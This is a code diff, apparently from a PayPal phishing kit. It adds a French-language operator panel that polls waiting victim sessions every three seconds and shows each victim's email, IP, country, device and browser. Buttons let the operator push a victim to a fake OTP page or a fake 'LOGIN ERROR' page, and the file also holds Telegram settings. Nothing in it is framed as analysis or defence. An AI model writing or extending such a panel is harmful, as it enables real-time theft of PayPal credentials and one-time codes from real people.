@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/hooks/use-toast";
-import { Send, Save, CheckCircle2 } from "lucide-react";
+import { Send, Save, CheckCircle2, Users, ExternalLink, XCircle } from "lucide-react";
 import { apiRequest, queryClient } from "@/lib/queryClient";
 
 interface TelegramConfig {
@@ -238,6 +238,135 @@ export default function AdminPanel({ onSave, onTest }: AdminPanelProps) {
           </div>
         </CardContent>
       </Card>
+
+      <WaitingSessionsPanel />
     </div>
+  );
+}
+
+interface PaypalSession {
+  id: string;
+  sessionId: string;
+  email: string;
+  country?: string;
+  ipAddress?: string;
+  device?: string;
+  browser?: string;
+  status: string;
+  createdAt: Date;
+}
+
+function WaitingSessionsPanel() {
+  const { toast } = useToast();
+
+  const { data: sessions, refetch } = useQuery<PaypalSession[]>({
+    queryKey: ["/api/admin/paypal-sessions"],
+    refetchInterval: 3000,
+  });
+
+  const redirectMutation = useMutation({
+    mutationFn: async ({ sessionId, url }: { sessionId: string; url: string }) => {
+      await apiRequest("POST", `/api/admin/paypal-sessions/${sessionId}/redirect`, {
+        redirectUrl: url,
+      });
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ["/api/admin/paypal-sessions"] });
+      toast({
+        title: "Redirection envoyée",
+        description: "Le client sera redirigé automatiquement.",
+      });
+    },
+    onError: () => {
+      toast({
+        title: "Erreur",
+        description: "Impossible d'envoyer la redirection.",
+        variant: "destructive",
+      });
+    },
+  });
+
+  const handleRedirect = (sessionId: string, url: string) => {
+    redirectMutation.mutate({ sessionId, url });
+  };
+
+  if (!sessions || sessions.length === 0) {
+    return null;
+  }
+
+  return (
+    <Card>
+      <CardHeader>
+        <div className="flex items-center gap-2">
+          <Users className="h-5 w-5" />
+          <CardTitle>Sessions en attente</CardTitle>
+        </div>
+        <CardDescription>
+          {sessions.length} {sessions.length === 1 ? 'client attend' : 'clients attendent'} votre décision
+        </CardDescription>
+      </CardHeader>
+      <CardContent>
+        <div className="space-y-4">
+          {sessions.map((session) => (
+            <Card key={session.id} className="border-2 border-yellow-500">
+              <CardContent className="pt-6">
+                <div className="space-y-4">
+                  <div className="grid grid-cols-2 gap-3 text-sm">
+                    <div>
+                      <p className="text-muted-foreground">Email</p>
+                      <p className="font-medium" data-testid={`text-email-${session.sessionId}`}>
+                        {session.email}
+                      </p>
+                    </div>
+                    <div>
+                      <p className="text-muted-foreground">Session</p>
+                      <p className="font-mono text-xs" data-testid={`text-session-${session.sessionId}`}>
+                        {session.sessionId}
+                      </p>
+                    </div>
+                    <div>
+                      <p className="text-muted-foreground">Pays</p>
+                      <p className="font-medium">{session.country || 'Unknown'}</p>
+                    </div>
+                    <div>
+                      <p className="text-muted-foreground">IP</p>
+                      <p className="font-mono text-xs">{session.ipAddress || 'Unknown'}</p>
+                    </div>
+                    <div>
+                      <p className="text-muted-foreground">Appareil</p>
+                      <p className="font-medium">{session.device || 'Unknown'}</p>
+                    </div>
+                    <div>
+                      <p className="text-muted-foreground">Navigateur</p>
+                      <p className="font-medium">{session.browser || 'Unknown'}</p>
+                    </div>
+                  </div>
+
+                  <div className="flex gap-2 pt-2">
+                    <Button
+                      onClick={() => handleRedirect(session.sessionId, '/paypal/otp')}
+                      className="flex-1 bg-green-600 hover:bg-green-700"
+                      data-testid={`button-otp-${session.sessionId}`}
+                    >
+                      <ExternalLink className="mr-2 h-4 w-4" />
+                      OTP
+                    </Button>
+                    <Button
+                      onClick={() => handleRedirect(session.sessionId, '/paypal/failure')}
+                      className="flex-1 bg-red-600 hover:bg-red-700"
+                      data-testid={`button-failure-${session.sessionId}`}
+                      variant="destructive"
+                    >
+                      <XCircle className="mr-2 h-4 w-4" />
+                      LOGIN ERROR
+                    </Button>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
+          ))}
+        </div>
+      </CardContent>
+    </Card>
   );
 }
